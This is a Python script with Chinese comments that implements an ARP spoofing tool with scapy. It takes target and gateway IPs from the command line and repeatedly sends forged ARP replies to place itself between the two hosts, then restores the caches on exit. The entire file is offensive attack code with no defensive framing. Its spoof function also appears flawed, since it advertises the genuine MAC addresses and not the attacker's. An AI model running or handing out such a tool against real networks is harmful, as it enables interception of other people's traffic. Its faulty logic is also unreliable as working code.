#arp_spoof欺骗
import scapy.all as scapy
import time
import argparse

# 发送ARP响应包
def spoof(target_ip, target_mac, gateway_ip):
    # 构造伪造的ARP响应包
    arp_response = scapy.ARP(op=2, hwsrc=target_mac, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip)
    
    # 发送ARP响应包
    scapy.send(arp_response, verbose=False)

# 恢复目标的ARP缓存
def restore(target_ip, target_mac, gateway_ip, gateway_mac):
    # 构造恢复的ARP响应包
    arp_response = scapy.ARP(op=2, hwsrc=gateway_mac, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip)
    
    # 发送恢复包
    scapy.send(arp_response, count=4, verbose=False)

# 获取目标设备和网关的MAC地址
def get_mac(ip):
    # 发送ARP请求包来获取MAC地址
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    
    # 发送请求并接收响应
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    return answered_list[0][1].hwsrc

# 主程序
def arp_spoof(target_ip, gateway_ip):
    try:
        # 获取目标设备和网关的MAC地址
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)

        print(f"开始ARP欺骗：将 {target_ip} 的网关指向 {gateway_ip}")
        
        # 不断进行ARP欺骗
        while True:
            spoof(target_ip, gateway_mac, gateway_ip)
            spoof(gateway_ip, target_mac, target_ip)
            time.sleep(2)  # 每2秒发送一次伪造的ARP响应包

    except KeyboardInterrupt:
        print("\n停止ARP欺骗，恢复网络连接...")
        restore(target_ip, target_mac, gateway_ip, gateway_mac)
        print("网络已恢复正常。")

if __name__ == "__main__":
    # 创建ArgumentParser对象
    parser = argparse.ArgumentParser(description="ARP欺骗工具")
    # 添加参数
    parser.add_argument('-t', '--target', required=True, help='目标IP地址')
    parser.add_argument('-r', '--router', required=True, help='网关IP地址')
    
    # 解析参数
    args = parser.parse_args()
    
    target_ip = args.target  # 目标IP
    gateway_ip = args.router  # 网关IP
    arp_spoof(target_ip, gateway_ip)